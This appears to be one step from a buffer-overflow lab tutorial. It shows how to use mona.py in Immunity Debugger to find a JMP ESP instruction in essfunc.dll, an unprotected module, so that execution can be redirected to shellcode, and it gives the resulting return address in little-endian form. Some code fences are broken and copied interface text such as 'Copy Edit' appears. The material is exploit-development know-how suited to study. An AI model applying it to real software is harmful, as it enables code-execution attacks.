# 6. Finding the Right Module (JMP ESP)

---

## ✅ Objective:
Find a JMP ESP instruction in a module that is:
- Not protected by ASLR/DEP
- Stable and safe to use
- Allows us to redirect execution to shellcode

---

## 🛠️ Used Tools:
- Immunity Debugger
- mona.py

---

## 📦 Steps:

1. Set mona working folder:
```bash
!mona config -set workingfolder c:\mona\%p
List modules:

bash
Copy
Edit
!mona modules
Chose module: essfunc.dll

Found JMP ESP:

bash
Copy
Edit
!mona find -s "\xff\xe4" -m essfunc.dll
Got address: 625011AF

Used in little endian format: \xAF\x11\x50\x62
